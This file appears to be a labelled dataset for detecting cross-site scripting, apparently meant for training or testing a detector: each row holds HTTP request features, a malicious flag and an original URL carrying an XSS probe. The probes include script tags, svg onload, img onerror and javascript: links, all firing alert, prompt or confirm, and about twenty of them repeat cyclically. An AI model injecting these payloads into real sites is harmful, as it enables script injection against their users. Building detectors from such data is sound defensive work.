src_port,dest_port,http_method,http_status,http_resp_len,http_url_len,url_contains_script_tag,url_contains_onerror,url_contains_onload,url_contains_onclick,url_contains_onmouseover,url_contains_onfocus,url_contains_alert,url_contains_javascript,url_contains_eval,url_contains_document,url_contains_cookie,url_contains_iframe,url_contains_svg,url_contains_img,url_contains_object,url_contains_embed,http_method_GET,http_method_POST,http_method_PUT,http_method_DELETE,url_has_query_params,url_query_param_count,url_encoded_chars,url_suspicious_chars,response_2xx,response_3xx,response_4xx,response_5xx,is_malicious,attack_type,timestamp,original_url
52374,3000,GET,200,3748,27,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:38:45.649706+0000,"/?q=""><svg%20onload=alert(1)>"
52382,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:38:47.664624+0000,/?q=</textarea><script>alert(1)</script>
52390,3000,GET,200,3748,33,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:38:49.680038+0000,/?q=<img%20src=1%20onerror=prompt(1)>
50926,3000,GET,200,3748,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:38:51.694331+0000,/?q=<marquee%20onstart=confirm(1)>
50930,3000,GET,200,3748,48,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:38:53.708167+0000,/?q=<script>/*</script><script>alert(1)</script>
50934,3000,GET,200,3748,34,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:38:55.721164+0000,/?q=<script>''-alert(1)//</script>
50948,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:38:57.735692+0000,/?q=<svg><script>alert(1)</script></svg>
50964,3000,GET,200,3748,79,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:38:59.749850+0000,/?q=<math%20xmlns='http://www.w3.org/1998/Math/MathML'><mstyle%20onload='alert(1)'>
59418,3000,GET,200,3748,44,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:39:01.764348+0000,/?q=<video%20src='invalid'%20onerror='alert(1)'>
59428,3000,GET,200,3748,39,0,0,0,0,0,0,1,1,0,0,0,0,0,0,1,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:39:03.777676+0000,/?q=<object%20data='javascript:alert(1)'>
59440,3000,GET,200,3748,37,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:39:05.790291+0000,/?q=<embed%20src='javascript:alert(1)'>
59448,3000,GET,200,3748,67,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:39:07.803823+0000,/?q=<form%20action='javascript:alert(1)'><input%20type='submit'></form>
59450,3000,GET,200,3748,29,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:39:09.818284+0000,/?q=<script>alert(1)</script>
36916,3000,GET,200,3748,32,0,1,0,0,0,0,1,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:39:11.831224+0000,/?q=<img%20src=x%20onerror=alert(1)>
36932,3000,GET,200,3748,25,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:39:13.843816+0000,/?q=<svg%20onload=alert(1)>
36934,3000,GET,200,3748,38,0,0,0,0,0,0,1,1,0,0,0,1,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:39:15.856419+0000,/?q=<iframe%20src='javascript:alert(1)'>
36942,3000,GET,200,3748,43,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:39:17.869490+0000,/?q=<a%20href='javascript:alert(1)'>Click</a>
36954,3000,GET,200,3748,38,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:39:19.882326+0000,/?q=<input%20autofocus%20onfocus=alert(1)>
46814,3000,GET,200,3748,26,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:39:21.896148+0000,/?q=<body%20onload=alert(1)>
46828,3000,GET,200,3748,36,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:39:23.908606+0000,/?q=<details%20open%20ontoggle=alert(1)>
46838,3000,GET,200,3748,27,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:39:25.922859+0000,"/?q=""><svg%20onload=alert(1)>"
46844,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:39:27.935538+0000,/?q=</textarea><script>alert(1)</script>
46854,3000,GET,200,3748,33,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:39:29.952083+0000,/?q=<img%20src=1%20onerror=prompt(1)>
45230,3000,GET,200,3748,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:39:31.965873+0000,/?q=<marquee%20onstart=confirm(1)>
45236,3000,GET,200,3748,48,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:39:33.981008+0000,/?q=<script>/*</script><script>alert(1)</script>
45246,3000,GET,200,3748,34,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:39:35.995162+0000,/?q=<script>''-alert(1)//</script>
45252,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:39:38.011625+0000,/?q=<svg><script>alert(1)</script></svg>
45268,3000,GET,200,3748,79,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:39:40.027773+0000,/?q=<math%20xmlns='http://www.w3.org/1998/Math/MathML'><mstyle%20onload='alert(1)'>
40622,3000,GET,200,3748,44,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:39:42.046291+0000,/?q=<video%20src='invalid'%20onerror='alert(1)'>
40636,3000,GET,200,3748,39,0,0,0,0,0,0,1,1,0,0,0,0,0,0,1,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:39:44.060880+0000,/?q=<object%20data='javascript:alert(1)'>
40650,3000,GET,200,3748,37,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:39:46.074631+0000,/?q=<embed%20src='javascript:alert(1)'>
40660,3000,GET,200,3748,67,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:39:48.089031+0000,/?q=<form%20action='javascript:alert(1)'><input%20type='submit'></form>
40670,3000,GET,200,3748,29,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:39:50.103822+0000,/?q=<script>alert(1)</script>
47112,3000,GET,200,3748,32,0,1,0,0,0,0,1,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:39:52.119108+0000,/?q=<img%20src=x%20onerror=alert(1)>
47118,3000,GET,200,3748,25,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:39:54.133303+0000,/?q=<svg%20onload=alert(1)>
47130,3000,GET,200,3748,38,0,0,0,0,0,0,1,1,0,0,0,1,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:39:56.146928+0000,/?q=<iframe%20src='javascript:alert(1)'>
47144,3000,GET,200,3748,43,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:39:58.160818+0000,/?q=<a%20href='javascript:alert(1)'>Click</a>
47148,3000,GET,200,3748,38,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:40:00.174735+0000,/?q=<input%20autofocus%20onfocus=alert(1)>
35954,3000,GET,200,3748,26,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:40:02.190318+0000,/?q=<body%20onload=alert(1)>
35960,3000,GET,200,3748,36,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:40:04.207718+0000,/?q=<details%20open%20ontoggle=alert(1)>
35974,3000,GET,200,3748,27,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:40:06.221626+0000,"/?q=""><svg%20onload=alert(1)>"
35990,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:40:08.235355+0000,/?q=</textarea><script>alert(1)</script>
35992,3000,GET,200,3748,33,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:40:10.249304+0000,/?q=<img%20src=1%20onerror=prompt(1)>
51758,3000,GET,200,3748,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:40:12.263877+0000,/?q=<marquee%20onstart=confirm(1)>
51764,3000,GET,200,3748,48,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:40:14.277433+0000,/?q=<script>/*</script><script>alert(1)</script>
51770,3000,GET,200,3748,34,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:40:16.290562+0000,/?q=<script>''-alert(1)//</script>
51784,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:40:18.305169+0000,/?q=<svg><script>alert(1)</script></svg>
